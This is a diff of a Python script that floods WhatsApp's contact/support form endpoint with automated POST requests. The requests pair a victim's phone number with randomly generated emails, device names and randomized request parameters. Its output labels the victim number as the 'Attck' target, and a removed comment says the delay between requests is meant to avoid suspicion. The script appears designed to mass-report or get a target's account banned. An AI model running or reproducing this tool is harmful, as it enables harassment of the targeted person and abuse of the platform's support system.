@@ -9,8 +9,6 @@ init(autoreset=True)
 import os
 print(f"Created by **>>BayLak<<** 2025/01/22")
 def is_valid_country_code(phone_number):
-    # Ensure the number starts with "+" followed by digits only
-    # Validate that the number contains a country code followed by 10 to 12 digits
     pattern = r"^\+\d{1,4}\d{10,12}$"  # Modified to allow 10 to 12 digits
     return re.match(pattern, phone_number) is not None
 while True:
@@ -48,8 +46,6 @@ def get_request_count():
                 print(Fore.RED + "Please enter a number greater than 0.")
         except ValueError:
             print(Fore.RED + "Please enter a valid number.")
-
-# Request the number of requests to send
 num_requests = get_request_count()        
 # Target URL
 url = "https://www.whatsapp.com/contact/noclient/async/new/"
@@ -77,10 +73,10 @@ headers = {
 
 # Data template to send in the request
 data = {
-    "country_selector": "",  # Will be filled dynamically
-    "email": "",  # Will be filled dynamically
-    "email_confirm": "",  # Will be filled dynamically
-    "phone_number": "",  # Will be filled dynamically
+    "country_selector": "",
+    "email": "", 
+    "email_confirm": "", 
+    "phone_number": "", 
     "platform": "",
     "your_message": "",
     "step": "articles",
@@ -143,7 +139,6 @@ def send_requests(num_requests, delay):
             __req = round(random.uniform(0.1, 10), 6)
             __a = random.randint(1, 1000000000)
             __rev = random.randint(1000000000, 9999999999)
-            # Update data dictionary with dynamic values
             data["country_selector"] = country_selector
             data["email"] = generate_random_email()
             data["email_confirm"] = data["email"]  # Ensure email_confirm is the same as email
@@ -155,18 +150,14 @@ def send_requests(num_requests, delay):
             data["__req"] = __req
             data["__a"] = __a
             data["__rev"] = __rev
-
-            # Send POST request
             response = requests.post(url, headers=headers, data=data)
 
             # Check if request was successful (status code 200)
             if response.status_code == 200:
                 print(f"{Fore.RED}request:{Fore.GREEN}({i+1}) {Fore.RED}device?:{Fore.GREEN}{random_name_phones} {Fore.RED}IP:{Fore.GREEN}{random_ip} {Fore.BLUE}-> {Fore.WHITE}Email:{data['email']} | Phone:{country_selector} {data['phone_number']} | Attck -> {replacement_number}")
-                save_response_to_log(response.text)  # Save the response to logs.txt
+                save_response_to_log(response.text) 
             else:
                 print(Fore.RED + f"{random_ip} {i+1} - Request failed with status code: {response.status_code}")
-            
-            # Delay between requests to avoid suspicion
             time.sleep(delay)
         except requests.exceptions.RequestException as e:
             print(f"{random_name_phones} {i+1} - An error occurred: {e}")
